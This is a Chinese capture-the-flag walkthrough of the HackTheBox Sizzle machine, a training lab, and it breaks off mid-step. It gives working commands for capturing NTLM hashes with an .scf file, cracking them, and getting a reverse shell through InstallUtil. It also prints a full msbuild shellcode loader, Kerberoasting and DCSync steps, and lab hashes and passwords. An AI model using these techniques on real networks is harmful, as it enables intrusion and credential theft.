> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ok3IrIhJ5RmoOTn2oHFlQA)

Sizzle是一个非常困难的靶机，知识点涉及smb匿名登陆、NTLM哈希获取、NTLM哈希破解、LDAP信息获取、WinRM登陆、绕过powershell受限环境、Kerberoasting、DCSync等。感兴趣的同学可以在HackTheBox中进行学习。

![图片](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA5L6FicGFs1h5ZWj3f1pjC43KqaGDPStgjVTHtDgfglkZw1iaGdVGIRxJLMWgicLGtL8KkEZO81qvw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)通关思维导图![图片](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA5L6FicGFs1h5ZWj3f1pjCy1iaO5rE2uCy94SjLLEdoeTm42TgfQZMSPZia5FIRdibVmvN5jxJO9vMg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

0x01 侦查
-------

### 端口探测

首先通过nmap对目标进行端口扫描

```
nmap -Pn -p- -sV -sC -A 10.10.10.103 -oA nmap_Sizzle  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)扫描结果显示目标开放了21、80、443、445等端口

#### 80/443端口

分别访问80和443端口，对应的都是同一张烤肉图片，猜测为同一站点![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)对该站点进行目录扫描

```
gobuster dir -u http://10.10.10.103 -w /usr/share/wordlists/dirb/big.txt -t 50  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)由于目录扫描常报错，最终整理后存在以下几个目录

```
images  
index.html  
certenroll  

```

访问`/certenroll`目录则界面显示403

#### 445端口

使用 smbmap 进行对 smb 服务进行扫描

```
smbmap -H 10.10.10.103  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)使用 smbclient 探测默认共享，发现如下共享名称

```
smbclient -N -L \\\\10.10.10.103  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)对其中各个共享名称进行访问，在共享`SYSVOL`中能够连接 smb 服务，遗憾的是无法执行命令 dir

```
smbclient -N //10.10.10.103/SYSVOL  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)尝试收集扫描到的共享名称并循环扫描，而命令中的 sed 主要用于匹配正则表达式

```
smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/'  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)通过正则匹配网站我们可以知道以上表达式匹配了什么 _**网站地址：https://regex101.com/r/ageDvh/1**_![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

查看正则匹配结果

```
smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' | while read share; do echo "======${share}======"; smbclient -N "//10.10.10.103/${share}" -c dir; echo; done  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)结果显示只有`Department Shares`存在多个目录，其他共享名连接失败或无法查看

将共享挂载到`\mnt`下便可以轻松访问

```
mkdir mnt  
mount -t cifs "//10.10.10.103/Department Shares" mnt  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)再次遍历后结果显示所有文件都是空值

```
cat xxx | xxd  

```

但是其中还存在一个`Users`目录，包含了多个用户名![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
amanda  amanda_adm  bill  bob  chris  henry  joe  jose  lkys37en  morgan  mrb3n  Public  

```

通过以下脚本进行遍历检查当前共享名下的写入权限

```
find . -type d | while read directory; do   
    touch ${directory}/0xdf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/0xdf;   
    mkdir ${directory}/0xdf 2>/dev/null && echo "${directory} - write dir" && rmdir ${directory}/0xdf;   
done  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)存在两个目录拥有写入权限，进入`/Users/Public`并写入测试文件`mac.txt`

```
cd Users/Public  
touch mac.txt  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)成功写入文件，但过一会回去看它会自动消失

```
watch -d "ls /mnt/Users/Public/*; ls /mnt/ZZ_ARCHIVE/*"  

```

经过测试发现其中的文件每隔4分钟清除一次

0x02 上线[amanda]
---------------

现在我们知道该靶机中存在用户交互，通过 Windows 资源管理器（.scf）使用户访问该文件的目录时打开 SMB 连接，比如在`mac.scf`中包含一个可以远程的图标路径。可在目标主机上放置`mac.scf`，并通过程序响应来捕获`NTLM v2`的哈希值

### 获取NTLM哈希值

首先创建 scf 文件并将其放到 Public 目录下

```
cp mac.scf mnt/Users/Public 
```

具体内容如下

```
[Shell]  
Command=2  
IconFile=\\10.10.14.3\icon  

```

使用 Responder 监听 tun0 网卡，成功收到响应报文

```
responder -I tun0  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)截屏2021-11-30 下午11.45.30

```
amanda::HTB:e0d93f9ed39533f0:CC05038D74917172FF7DBBDF574D466F:010100000000000000115E15D5E5D701671F0C8E2D9F87EC0000000002000800470032005400380001001E00570049004E002D004F005A005A0051005200550058004B004D004A00310004003400570049004E002D004F005A005A0051005200550058004B004D004A0031002E0047003200540038002E004C004F00430041004C000300140047003200540038002E004C004F00430041004C000500140047003200540038002E004C004F00430041004C000700080000115E15D5E5D70106000400020000000800300030000000000000000100000000200000618685F222EA1F2B581F5A3E318D00997B3ED8A8504849C36733BA7C7E72A9AA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003300000000000000000000000000 
```

### 哈希值破解

使用 hashcat 对其中的哈希值进行破解

```
hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt --force  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)成功破解密码为`Ashare1972`，使用该账号密码检查 smb 共享

```
smbmap -H 10.10.10.103 -u amanda -p Ashare1972  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)截屏2021-12-01 上午12.01.53

### 登陆服务

#### smb登陆

使用 smbclient 连接目标 smb 共享 CertEnroll

```
smbclient -U 'amanda%Ashare1972' //10.10.10.103/CertEnroll  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)其中存在许多证书，但是并没有发现可利用点

#### LDAP信息获取

使用 ldapdomaindump 通过收集活动目录信息

```
ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o ldap/  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)在其中获取到如下信息，其中包含计算机信息、用户信息等。与此同时可知靶机处于域环境内，用户 sizzler 是域管理员![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在谷歌中搜索 certenroll 发现这是域认证服务，其中还包含目录`certsrv`![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)访问站点目录`http://10.10.10.103/certsrv`出现跳出登录界面![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

输入用户 amanda 的账号密码后成功登录![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

那么为什么之前 gobuster 无法扫描到该目录呢？再次扫描进行查看

```
gobuster dir -u http://10.10.10.103 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/IIS.fuzz.txt -t 20 
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)这次直接使用 IIS 的 fuzz 字典扫描到了目标目录，说明之前的字典中未包含该目录

#### WinRM登陆

登录后页面允许我生成一个证书，说明我可以冒充用户 amanda 的身份，接下来我需要对应的证书和密钥来通过身份认证。openssl 是个不错的选择。通过它可以生成密钥（key）和证书签名请求（csr）

```
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)查看证书签名请求（csr）

```
cat amanda.csr  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)切换至站点并在其中找到证书生成界面，选择高级证书请求![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)粘贴之前的证书签名请求（csr）后点击提交![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)成功生成并下载证书![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

将证书移至本目录下并重命名为 amanda.cer

```
mv ~/Downloads/certnew.cer amanda.cer  

```

有了证书和密钥我们可以通过 WinRM 与 amanda 身份来进行身份验证。对 Alamot 的 Ruby 脚本稍作修改如下

_**原脚本地址：https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb**_

> Windows 远程管理 (WinRM) 是WS-Management Protocol的 Microsoft 实现，WS-Management Protocol是一种基于标准简单对象访问协议 (SOAP) 的防火墙友好协议，允许来自不同供应商的硬件和操作系统进行互操作。WS-Management 协议规范为系统提供了一种在 IT 基础设施中访问和交换管理信息的通用方法。WinRM 和智能平台管理接口 (IPMI)以及事件收集器是Windows 硬件管理功能的组件。

```
#!/usr/bin/ruby  
require 'winrm'  
  
# Author: Alamot  
  
conn = WinRM::Connection.new(   
  endpoint: 'https://10.10.10.103:5986/wsman',  
  transport: :ssl,  
  client_cert: '/root/hackthebox/Machines/Sizzle/cert/amanda.cer',  
  client_key: '/root/hackthebox/Machines/Sizzle/cert/amanda.key',  
  :no_ssl_peer_verification => true  
)  
  
command=""  
  
conn.shell(:powershell) do |shell|  
    until command == "exit\n" do  
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")  
        print(output.output.chomp)  
        command = gets          
        output = shell.run(command) do |stdout, stderr|  
            STDOUT.print stdout  
            STDERR.print stderr  
        end  
    end      
    puts "Exiting with code #{output.exitcode}"  
end  

```

在该脚本可以看到连接为SSL，其中指定了证书和密钥来连接目标的5986端口，连接后直接返回 powershell 命令行

```
ruby winrm_shell.rb  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)截屏2021-12-01 上午11.00.03

注意：如果报错，无法加载 winrm 包，可以执行以下命令来进行安装

```
gem install winrm  
gem install winrm-fs  

```

0x03 权限提升[mrlky]
----------------

### 受限环境

执行命令可发现当前运行环境处于受限模式，同时 AppLocker 会限制运行内容

```
$executioncontext.sessionstate.languagemode  
Get-AppLockerPolicy -Effective -XML  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)截屏2021-12-01 上午11.26.16

### 绕过CLM

#### PSByPassCLM

使用 PSByPassCLM 可突破 CLM(Constrained Language Mode)，首先将其上传到`\users\amanda\appdata\local\temp\`目录下 _**工具下载地址：https://github.com/padovah4ck/PSByPassCLM**_

在本地开启 http 服务

```
python -m SimpleHTTPServer 80  

```

在靶机中下载 PSByPassCLM.exe

```
wget http://10.10.14.3/PsBypassCLM.exe -OutFile PsBypassCLM.exe  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)同时在本地开启监听服务

```
rlwrap nc -nvlp 5555  

```

在靶机上利用 PsBypassCLM 执行命令绕过CLM完成反弹shell

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.3 /rport=5555 \users\amanda\appdata\local\temp\PsBypassCLM.exe  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)成功收到反弹shell

#### MSF

也可以使用 MSF 来生成 shellcode 用于执行反弹shell

```
msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp lhost=10.10.14.5 lport=445 -e x86/shikata_ga_nai -i 100 -f csharp > shellcode.txt  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)将下面 xml 文件中的 shellcode 替换成成功生成的 shellcode

```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">  
  <!-- This inline task executes shellcode. -->  
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->  
  <!-- Save This File And Execute The Above Command -->  
  <!-- Author: Casey Smith, Twitter: @subTee -->   
  <!-- License: BSD 3-Clause -->  
  <Target >  
    <ClassExample />  
  </Target>  
  <UsingTask  
    Task  
    TaskFactory="CodeTaskFactory"  
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >  
    <Task>  
      
      <Code Type="Class" Language="cs">  
      <![CDATA[  
        using System;  
        using System.Runtime.InteropServices;  
        using Microsoft.Build.Framework;  
        using Microsoft.Build.Utilities;  
        public class ClassExample :  Task, ITask  
        {           
          private static UInt32 MEM_COMMIT = 0x1000;            
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;            
          [DllImport("kernel32")]  
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,  
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);            
          [DllImport("kernel32")]  
            private static extern IntPtr CreateThread(              
            UInt32 lpThreadAttributes,  
            UInt32 dwStackSize,  
            UInt32 lpStartAddress,  
            IntPtr param,  
            UInt32 dwCreationFlags,  
            ref UInt32 lpThreadId             
            );  
          [DllImport("kernel32")]  
            private static extern UInt32 WaitForSingleObject(             
            IntPtr hHandle,  
            UInt32 dwMilliseconds  
            );            
          public override bool Execute()  
          {  
            byte[] shellcode = new byte[195] {  
              0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,  
              0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,  
              0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,  
              0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,  
              0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,  
              0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,  
              0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,  
              0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,  
              0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,  
              0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,  
              0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,  
              0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,  
           0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x20,0x63,0x00 };  
                
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,  
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);  
              IntPtr hThread = IntPtr.Zero;  
              UInt32 threadId = 0;  
              IntPtr pinfo = IntPtr.Zero;  
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);  
              WaitForSingleObject(hThread, 0xFFFFFFFF);  
              return true;  
          }   
        }       
      ]]>  
      </Code>  
    </Task>  
  </UsingTask>  
</Project>  

```

将其命名为 meterpreter.csproj 并上传

```
iwr -uri http://10.10.14.3/meterpreter.csproj -outfile mac.csproj  

```

在本地使用 msf 开启监听

```
msconsole  
msf > use exploit/multi/handler  
msf > set payload windows/meterpreter/reverse_tcp  
msf > set lhost 10.10.14.3  
msf > set lport 445  
msf > run  

```

然后在靶机中通过 msbuild 运行

```
copy mac.csproj c:\windows\system32\spool\drivers\color\  
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe c:\windows\system32\spool\drivers\color\mac.csproj  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)但是未获得 msf 会话，猜测应该是没绕过 AV 限制

### Kerberoasting

在新的会话中查看端口开放情况

```
netstat -ano  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)在其中发现了nmap扫描未发现的88端口，说明该端口可能已被防火墙屏蔽。而目前我们能够访问到本地88端口，因此可使用 Kerberoast，可通过以下几种方法来获取 Kerberoast

#### Rubeus

借助 Rubeus 可获取 Kerberoast，该工具需要自己来编译 C# 文件来生成 exe _**下载地址：https://github.com/GhostPack/Rubeus**_

将其上传至靶机的`\users\amanda\appdata\local\temp\`目录下

```
wget http://10.10.14.3/Rubeus.exe -outfile Rubeus.exe  

```

运行命令即可获取到对应的 NTML 哈希值

```
.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972  

```

#### Chisel转发

使用 Chisel 这个工具能够帮助我们完成端口转发 _**下载地址：https://github.com/jpillora/chisel**_

首先在靶机中下载该程序，并通过它将本地88端口和389端口转发至本地8008端口

```
wget http://10.10.14.3/chisel_1.7.6_windows_amd64.exe -outfile chisel.exe  
cd c:\Windows\temp\  
copy \users\amanda\appdata\local\temp\chisel.exe c:\windows\system32\spool\drivers\color\chisel.exe  
.\chisel.exe client 10.10.14.3:8008 R:88:127.0.0.1:88 R:389:localhost:389  

```

在本地将 chisel 反弹的8008端口作为服务端用于访问目标的88端口和389端口

```
./chisel server -p 8008 --reverse  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)使用 GetUserSPNs.py 能够获取 kerberoast

```
python3 GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda -save -outputfile GetUserSPNs.out  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)需要注意的是如果要使 kerberos 工作，操作时间必须在五分钟之内，否则无法获取

```
python3 GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)截屏2021-12-02 下午4.01.42

### NTLM哈希破解

为了破解 NTLM v2 哈希值，我们首先要将哈希值写入`mrlky.ntlm`当中

```
$krb5tgs$23$*mrlky$HTB.LOCAL$htb.local/mrlky*$a0834969ff71ab60cdf6a4b2dc293533$34a0be7356e57394ebe0597ef28adb9d9b1e3b05853909590f8bdfab9b3c18d75c92ee9ae63d7678851586ea7277cfc253a529c272976abc2f8d07a05afff45b36415f2bc15aefc54a5fe9b0837a31adaba1a2117d9c3ee155c2dfed1f2df912eac9f1bc76d726914fed25c5a15948bdc101de78b6bce338fadad10695a364ed5d4f70ee5aa4d1a7f1f5a5ad59118d19075071aa0b61c387677a4eca0ea59c1addae5f3c5bee3cffa58e510d89fba3f24e566773abd85198870ac8dc2a4f7f9a2bc5a39cc5b060149c7129829bfddb51d5c80f5964e047bd375d69a8a42d0c562a59024f666d489ee281f3ec9b254e008e3c8e821d6f26654a7fecba109dbb4a7ae4e5da905d2e1d06b47591df0e15ef46ce11576ca206291f8ee4319daf8a7cf9f3c36eee10db84bde838c8e44991a2fe888087ca0778863592eaab06bd7d44972430ad0426e5a4127db08f8f642e8bd9b211336fc7447fd3fad88dc8d120501454c8149464aca470d47892e8196d81e3fa8f090142abea97ac037a27ae2e359cadbaab9ef0551d6ac9bfd490a91af62ff5b11e5df756ad70a874f2037715aabb11d19561872a9867d859fecde373115d8f1bd7d7264277a8621e08ef273d984c396342b68eebae52604828e5a6ec28cd8d772732122d216c46c0184b5bb6c60a9d6fa8fd10a5f4077abb78c927f59bcb833d037a2502809b11a23d5216bda03e8f29d4e5915a82cd8c96fe75cfa7c2b0562bfd77575ca02c170361efd9f1016b6457d365c6b1bab3edce635cf20a8c9edab1d9f9a4dde1d5c65a482fea3279805bb8c99069209772b05872588bc5b245bab073015532966b1e78eb5b8913d84dce8a3188e7b5f2bbf2bd73db95238fb3155e97fdf98c1cf4f43d28fa4ae8799f699a1eb4d9ec958cf3c5a1c72679f0c3a53e1d94bda3138251ca0d74bb8061032b3ee78c27f8722863f83e2d59568739378ef646710b4d12c6d65d18dd8eef91e56aec74647c5fd378096a8602f7647f36f6410529a4dd038842d6cc9434a71c76dc0c711d10198464bae92490cc3a3a0e74a88a1d6c3537b7252974d2fdf627e0db9972390402a05c7169267fc2757e58d8d29e0345b8737eedb7cd16516790e89882c2145040789d9690074cac529f8afa68ebe3b6a6509bf902a640c951b09acee2f03ba14d057326c25dd476c20d635f5fc53501cb37fe27c01c30c1c581301ca121bab48cea7683499de297073ad650e9c0e70c89  

```

使用 hashcat 进行破解

```
hashcat -m 13100 -a 0 mrlky.ntlm /usr/share/wordlists/rockyou.txt --force  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)成功拿到密码为`Football#7`

### WinRM登陆

使用 openssl 再次生成密钥（key）和证书签名请求（csr）

```
openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)与之前一样登录 mrlky 账户，生成证书后将证书移至本目录下并重命名为 amanda.cer

```
mv ~/Downloads/certnew.cer mrlky.cer  

```

修改 WinRM 登陆脚本如下

```
#!/usr/bin/ruby  
require 'winrm'  
  
# Author: Alamot  
  
conn = WinRM::Connection.new(   
  endpoint: 'https://10.10.10.103:5986/wsman',  
  transport: :ssl,  
  client_cert: '/root/hackthebox/Machines/Sizzle/cert/mrlky.cer',  
  client_key: '/root/hackthebox/Machines/Sizzle/cert/mrlky.key',  
  :no_ssl_peer_verification => true  
)  
  
command=""  
  
conn.shell(:powershell) do |shell|  
    until command == "exit\n" do  
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")  
        print(output.output.chomp)  
        command = gets          
        output = shell.run(command) do |stdout, stderr|  
            STDOUT.print stdout  
            STDERR.print stderr  
        end  
    end      
    puts "Exiting with code #{output.exitcode}"  
end  

```

执行后成功通过 WinRM 获得 mrlky 权限![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

0x04 权限提升[administrator]
------------------------

### Bloodhound

使用 Bloodhound 可了解该主机中其他用户拥有何种权限 _**下载地址：https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3**_ 通过 smb 服务上传 bloodhound，与此同时运行 smbserver 开启 smb 服务 需要注意的是由于靶机中不允许连接未经身份认证的共享，所以我们需要设置账号密码来进行身份验证

```
python3 smbserver.py -smb2support mac . -username mac -password mac  

```

连接共享后将 Bloodhound 上传

```
net use \\10.10.14.5\mac\ /u:mac mac  
copy BloodHound.zip \\10.10.14.5\mac\  

```

在本地查看 bloodhound 中的节点信息，其中显示它拥有 GetChangesALL 权限，这也就意味着我可以进行 dcsync 攻击，最终通过 secretsdump 来获取管理员的哈希值

### 尝试哈希破解

意外的是`C:\Windows\system32`目录下存在`file.txt`，其中包含多个用户的哈希值![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)在其中存在用户 mrlky 和管理员的哈希值

```
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::  

```

使用 john 进行爆破

```
